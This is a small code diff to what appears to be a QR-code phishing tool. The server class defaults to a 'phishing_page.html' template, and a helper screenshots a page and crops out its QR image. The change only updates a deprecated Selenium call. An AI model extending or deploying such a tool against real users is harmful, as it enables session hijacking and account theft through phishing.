@@ -4,6 +4,7 @@ from jinja2 import Environment, PackageLoader, FileSystemLoader
 from binascii import a2b_base64
 from PIL import Image
 from . import Settings
+from selenium.webdriver.common.by import By
 
 class server:
     def __init__(self, template_name="phishing_page.html", *args, **kwargs):
@@ -39,7 +40,7 @@ class misc:
     def Screenshot( browser, img_xpath, name): # PicName, location, size):
         # Take a screenshot to the page then cut the QR image
         img_path  = os.path.join(Settings.path, "core", "www", name, "full.png")
-        imgObject = browser.find_elements_by_xpath(img_xpath)[0]    # Getting the image element
+        imgObject = browser.find_element(By.XPATH, img_xpath)      # Getting the image element
         browser.save_screenshot(img_path)                           # Taking screenshot to the whole page
         img = Image.open(img_path)
         left,top = imgObject.location['x'],imgObject.location['y']  # Getting the image exact location (1)
